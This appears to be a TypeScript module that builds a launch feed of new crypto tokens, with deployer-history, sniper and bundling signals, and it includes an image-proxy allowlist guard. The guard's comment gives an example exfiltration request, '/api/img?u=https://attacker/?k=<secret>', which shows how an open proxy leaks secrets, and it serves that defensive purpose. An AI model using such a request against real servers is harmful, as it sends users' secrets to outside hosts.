/**
 * Reading the pons new-pairs feed.
 *
 * One source: our own on-chain index. GMGN was wired in for a while to cover
 * the other launchpads on this chain, and it is gone — its new-token stream
 * does not carry pons launches at all (they surface there only once graduated,
 * by which point they are hours to weeks old), so for pons specifically it was
 * never the better source. Everything here comes from TokenLaunched on the pons
 * factory, priced from curve reserves the trade stream keeps exact.
 *
 * Every row is therefore a token this app can actually buy.
 */
import { db } from "../db/index";
import { bundledByCurve } from "./clusters";
import { buildRates } from "./usd";

/** Every pons launch mints the same fixed supply, in whole tokens. */
const SUPPLY = 1e9;

/**
 * How close to the launch a buy has to be to count as a snipe.
 *
 * Three blocks is about 0.3 seconds. Nobody reads a feed, decides, signs and
 * lands inside that, so these are bots that were waiting for the token to
 * exist rather than people who saw it.
 */
const SNIPE_BLOCKS = 3;

/** Minutes of price history drawn on each row. */
const SPARK_MINUTES = 20;

export interface FeedFilters {
  /** How far back to read. Rows are returned newest first. */
  maxAgeMin: number;
  limit: number;
}

export const DEFAULT_FILTERS: FeedFilters = {
  maxAgeMin: 180,
  limit: 250,
};

export interface FeedRow {
  token: string;
  curve: string;
  symbol: string;
  name: string;
  logo: string;
  /** The asset the curve trades against — ETH, USDG, NVDA and so on. */
  quoteSymbol: string;
  ageMinutes: number;
  /** In the quote asset. */
  mcap: number;
  volume: number;
  liquidity: number;
  /** In dollars, or null when the quote asset has no known rate. */
  mcapUsd: number | null;
  volumeUsd: number | null;
  liquidityUsd: number | null;
  buys: number;
  sells: number;
  trades: number;
  /** Wallets still holding a positive balance, from the trade stream. */
  holders: number;
  progressPct: number;
  priceQuote: number;

  /** Who deployed it. */
  deployer: string;
  /** Other launches by this deployer inside the feed window. */
  devLaunches: number;
  /** How many of those reached a graduated pool. */
  devGraduated: number;
  /**
   * How many of those ever traded at all.
   *
   * The blunt one. About half of all launches never see a single buy, so a
   * deployer whose previous coins are mostly in that half is not unlucky.
   */
  devTraded: number;
  /** Share of supply the deployer bought of their own launch, 0-1. */
  devHoldRate: number;
  /** True when the deployer has sold any of what they bought. */
  devSold: boolean;
  /** Share of supply held by the ten largest wallets, 0-1. */
  top10Rate: number;

  /** The one link the token carries on-chain, or "" — usually an X profile. */
  socials: string;
  /** The blurb the deployer wrote, or "". */
  description: string;
  /** Wallets whose first buy landed within SNIPE_BLOCKS of the launch. */
  snipers: number;
  /** Wallets that bought in the launch block itself. */
  sameBlock: number;
  /**
   * Price per minute over the recent window, oldest first, in the quote asset.
   *
   * Gaps are carried forward rather than left as zero: a minute with no trade
   * is a minute at the same price, and drawing it as nothing would put a
   * cliff to the floor in every quiet stretch.
   */
  spark: number[];
  /**
   * The largest number of this coin's buyers that are one operator.
   *
   * A floor, not a count: wallets created since the cluster scan are unknown
   * and read as separate people. Zero means "nothing found", which is not the
   * same as "nobody is bundling".
   */
  bundled: number;
}

interface Raw {
  token: string;
  curve: string;
  symbol: string | null;
  name: string | null;
  logo: string | null;
  quote_symbol: string | null;
  /** The quote asset's contract, needed to read its dividend multiplier. */
  quote_token: string | null;
  quote_is_native: number;
  created_at: string;
  price: number | null;
  mcap: number | null;
  liquidity: number | null;
  progress_pct: number | null;
  vol: number | null;
  buys: number | null;
  sells: number | null;
  holders: number | null;
  deployer: string | null;
  dev_net: number | null;
  dev_bought: number | null;
  top10: number | null;
  dev_launches: number | null;
  dev_graduated: number | null;
  dev_traded: number | null;
  socials: string | null;
  description: string | null;
  snipers: number | null;
  same_block: number | null;
}

export async function readFeed(
  f: FeedFilters,
): Promise<{ rows: FeedRow[]; total: number; ethUsd: number | null; unpriced: string[] }> {
  const since = new Date(Date.now() - f.maxAgeMin * 60_000).toISOString();
  /*
   * Read wider than we return, then slice.
   *
   * This was once a flat LIMIT 300, which at ~29 launches a minute meant the
   * feed only ever considered the last ten minutes: 519 rows offered from an
   * index holding 5,293, so a coin seen a quarter of an hour earlier could not
   * be found at any display limit. Only `limit` rows go over the wire either
   * way, so reading deep costs a wider query and nothing else.
   */
  const depth = Math.min(2000, Math.max(600, f.limit * 4));

  let raw: Raw[] = [];
  try {
    raw = db()
      .prepare(
        `SELECT t.token, t.curve, t.symbol, t.name, t.logo, t.quote_symbol,
                t.quote_token, t.quote_is_native, t.created_at, t.price, t.mcap, t.liquidity,
                t.progress_pct, t.deployer, t.socials, t.description,
                -- Correlated because the cut-off is per token: each curve is
                -- compared against its own launch block.
                -- The deployer is excluded from both. Nearly every launch has
                -- the dev buying its first block, so counting them made "1
                -- sniper" the reading on most rows and meant nothing.
                (SELECT COUNT(*) FROM feed_positions ps
                  WHERE ps.curve = t.curve AND ps.first_block IS NOT NULL
                    AND ps.wallet <> t.deployer
                    AND ps.first_block <= t.launch_block + ${SNIPE_BLOCKS}) AS snipers,
                (SELECT COUNT(*) FROM feed_positions pz
                  WHERE pz.curve = t.curve AND pz.first_block IS NOT NULL
                    AND pz.wallet <> t.deployer
                    AND pz.first_block <= t.launch_block) AS same_block,
                v.vol, v.buys, v.sells,
                h.holders, h.top10,
                d.net AS dev_net, d.bought AS dev_bought,
                dl.n AS dev_launches, dl.grad AS dev_graduated, dl.traded AS dev_traded
           FROM feed_tokens t
           LEFT JOIN (
             SELECT curve, SUM(quote) AS vol, SUM(buys) AS buys, SUM(sells) AS sells
               FROM feed_volume WHERE bucket >= ? GROUP BY curve
           ) v ON v.curve = t.curve
           -- Holders are wallets still in profit-or-loss on the token, not
           -- everyone who ever touched it, and top10 is what the largest ten
           -- of them hold between them.
           LEFT JOIN (
             SELECT curve,
                    COUNT(*) AS holders,
                    SUM(net) AS held,
                    (SELECT SUM(net) FROM (
                       SELECT net FROM feed_positions p2
                        WHERE p2.curve = p.curve AND p2.net > 0
                        ORDER BY net DESC LIMIT 10)) AS top10
               FROM feed_positions p WHERE net > 0 GROUP BY curve
           ) h ON h.curve = t.curve
           -- The deployer's own position on their own launch.
           LEFT JOIN (
             SELECT curve, wallet, net, net AS bought FROM feed_positions
           ) d ON d.curve = t.curve AND d.wallet = t.deployer
           LEFT JOIN (
             /*
              * The deployer's record, not just their count.
              *
              * A launch two seconds old tells you nothing about itself. Who
              * made it is the only fact available at the moment the decision
              * has to be made, and it is knowable: this index holds every
              * launch on the chain, so a deployer on their sixty-fourth coin
              * with nothing graduated is visible the instant the sixty-fifth
              * appears.
              *
              * The traded column counts launches that ever saw a buy or a sell.
              * Roughly half of all launches never trade at all, so a deployer
              * whose previous coins are mostly in that group is not unlucky —
              * that is what they make.
              */
             SELECT t2.deployer,
                    COUNT(*) AS n,
                    SUM(t2.graduated) AS grad,
                    SUM(CASE WHEN vv.curve IS NOT NULL THEN 1 ELSE 0 END) AS traded
               FROM feed_tokens t2
               LEFT JOIN (SELECT DISTINCT curve FROM feed_volume) vv ON vv.curve = t2.curve
              GROUP BY t2.deployer
           ) dl ON dl.deployer = t.deployer
          WHERE t.created_at >= ? AND t.graduated = 0
          -- Chain order, not insert order.
          --
          -- Sorting on created_at looked right and was not: every token found
          -- in one sweep is written with the same timestamp, so 1,675 of 3,282
          -- rows tied with at least one other and SQLite returned those ties
          -- in whatever order it liked. Some spanned 134 blocks, so coins
          -- thirteen seconds apart on chain were shuffled together.
          ORDER BY t.launch_block DESC, t.log_index DESC
          LIMIT ?`,
      )
      .all(Math.floor(Date.now() / 60_000) - 1440, since, depth) as unknown as Raw[];
  } catch {
    return { rows: [], total: 0, ethUsd: null, unpriced: [] };
  }
  if (!raw.length) return { rows: [], total: 0, ethUsd: null, unpriced: [] };

  /*
   * Every row's recent price history in one query, then shaped here.
   *
   * One query for the lot rather than one per row: at 250 rows the per-row
   * version would be 250 round trips into SQLite on every two-second poll.
   */
  /*
   * How much of each coin's crowd is one operator.
   *
   * One query for every position in the window and the grouping done here:
   * measured at 4,330 rows over 520 curves, so the whole join is cheaper than
   * the per-curve queries it replaces.
   */
  let bundled = new Map<string, number>();
  try {
    bundled = bundledByCurve(
      db().prepare(`SELECT curve, wallet FROM feed_positions`).all() as {
        curve: string;
        wallet: string;
      }[],
    );
  } catch {
    /* no cluster data; every row reports zero */
  }

  const nowBucket = Math.floor(Date.now() / 60_000);
  const sparks = new Map<string, number[]>();
  try {
    const hist = db()
      .prepare(
        `SELECT curve, bucket, price FROM feed_prices
          WHERE bucket > ? ORDER BY curve, bucket`,
      )
      .all(nowBucket - SPARK_MINUTES) as { curve: string; bucket: number; price: number }[];

    /** Sparse minute -> price, per curve, before the gaps are filled. */
    const sparse = new Map<string, Map<number, number>>();
    for (const h of hist) {
      const i = SPARK_MINUTES - 1 - (nowBucket - h.bucket);
      if (i < 0 || i >= SPARK_MINUTES) continue;
      let m = sparse.get(h.curve);
      if (!m) sparse.set(h.curve, (m = new Map()));
      m.set(i, h.price);
    }

    for (const [curve, m] of sparse) {
      /*
       * Carry the last known price across quiet minutes.
       *
       * A minute with no trade is not a price of zero, it is the same price as
       * before — leaving the gap at zero drew a cliff to the floor and back on
       * every coin that paused, which is most of them. Leading minutes before
       * the first known price stay absent rather than being back-filled with a
       * price that did not exist yet.
       */
      const out: number[] = [];
      let last = 0;
      for (let i = 0; i < SPARK_MINUTES; i++) {
        const v = m.get(i);
        if (v != null && v > 0) last = v;
        if (last > 0) out.push(last);
      }
      if (out.length > 1) sparks.set(curve, out);
    }
  } catch {
    /* history is decoration; a row without it still renders */
  }

  const quoteOf = (r: Raw) => (r.quote_is_native === 1 ? "ETH" : (r.quote_symbol ?? "?"));
  // One rate lookup per distinct quote asset, not per row.
  /*
   * Addresses as well as symbols, so a stock token's dividend multiplier can
   * be read. Without them the rate is the share price, which stopped being
   * what one token is worth at the first dividend.
   */
  const quoteTokens = [
    ...new Map(
      raw
        .filter((r) => r.quote_is_native !== 1 && r.quote_token && r.quote_symbol)
        .map((r) => [r.quote_symbol as string, { symbol: r.quote_symbol as string, address: r.quote_token as string }]),
    ).values(),
  ];
  const rates = await buildRates(raw.map(quoteOf), quoteTokens);
  const unpriced = new Set<string>();

  const rows: FeedRow[] = raw.map((r) => {
    const quoteSymbol = quoteOf(r);
    const rate = rates.get(quoteSymbol.toUpperCase()) ?? null;
    if (rate == null) unpriced.add(quoteSymbol);

    const mcap = r.mcap ?? 0;
    const volume = r.vol ?? 0;
    const liquidity = r.liquidity ?? 0;
    const buys = r.buys ?? 0;
    const sells = r.sells ?? 0;
    return {
      token: r.token,
      curve: r.curve,
      symbol: r.symbol ?? "???",
      name: r.name ?? "",
      logo: r.logo ?? "",
      quoteSymbol,
      ageMinutes: Math.max(0, (Date.now() - Date.parse(r.created_at)) / 60_000),
      mcap,
      volume,
      liquidity,
      mcapUsd: rate == null ? null : mcap * rate,
      volumeUsd: rate == null ? null : volume * rate,
      liquidityUsd: rate == null ? null : liquidity * rate,
      buys,
      sells,
      trades: buys + sells,
      holders: r.holders ?? 0,
      progressPct: r.progress_pct ?? 0,
      priceQuote: r.price ?? 0,
      deployer: r.deployer ?? "",
      devLaunches: r.dev_launches ?? 0,
      devGraduated: r.dev_graduated ?? 0,
      devTraded: r.dev_traded ?? 0,
      // Supply is a fixed 1e9 tokens on every pons launch.
      devHoldRate: Math.max(0, Math.min(1, (r.dev_net ?? 0) / SUPPLY)),
      // A negative net means they have sold more than the stream saw them buy,
      // which in practice means they sold what they were holding.
      devSold: (r.dev_net ?? 0) < 0,
      top10Rate: Math.max(0, Math.min(1, (r.top10 ?? 0) / SUPPLY)),
      socials: r.socials ?? "",
      description: r.description ?? "",
      snipers: r.snipers ?? 0,
      sameBlock: r.same_block ?? 0,
      spark: sparks.get(r.curve) ?? [],
      bundled: bundled.get(r.curve) ?? 0,
    };
  });

  return {
    rows: rows.slice(0, f.limit),
    total: rows.length,
    ethUsd: rates.get("ETH") ?? null,
    unpriced: [...unpriced].sort(),
  };
}


/**
 * Is this a logo URL the app has actually indexed?
 *
 * Guards the image proxy. Without it /api/img fetches any URL it is given,
 * which makes it a same-origin exfiltration channel no CSP can close: a script
 * on the page calls /api/img?u=https://attacker/?k=<secret> and the server
 * makes that request for it.
 *
 * Answered from the feed's own table, so it needs no separate allowlist to
 * maintain and cannot drift out of step with what the feed is showing. Cached
 * briefly because the feed repaints constantly and this is on the path of
 * every image.
 */
const logoCache = { at: 0, set: new Set<string>() };
const LOGO_TTL_MS = 30_000;

export function isKnownLogo(url: string): boolean {
  const u = url.trim();
  if (!u) return false;

  if (Date.now() - logoCache.at > LOGO_TTL_MS) {
    try {
      const rows = db()
        .prepare(`SELECT DISTINCT logo FROM feed_tokens WHERE logo IS NOT NULL AND logo <> ''`)
        .all() as { logo: string }[];
      logoCache.set = new Set(rows.map((r) => r.logo.trim()));
      logoCache.at = Date.now();
    } catch {
      return false;
    }
  }
  if (logoCache.set.has(u)) return true;

  /*
   * A miss is not an answer yet.
   *
   * The cache is up to thirty seconds old and this feed shows coins that
   * launched four seconds ago, so the newest rows — the ones anyone is
   * actually looking at — were refused for as long as the cache lagged
   * behind them. Measured on the live site: 8 of 30 logos got a 403 and
   * only 39% of artwork loaded, against 86% before the allowlist existed.
   *
   * So a miss falls through to the table itself. It is an indexed-ish lookup
   * on a few thousand rows, it only runs for logos the cache has not caught
   * up with, and a hit is folded back in so it costs once.
   */
  try {
    const row = db()
      .prepare(`SELECT 1 AS ok FROM feed_tokens WHERE logo = ? LIMIT 1`)
      .get(u) as { ok?: number } | undefined;
    if (row?.ok) {
      logoCache.set.add(u);
      return true;
    }
  } catch {
    /* fall through to a refusal */
  }
  return false;
}
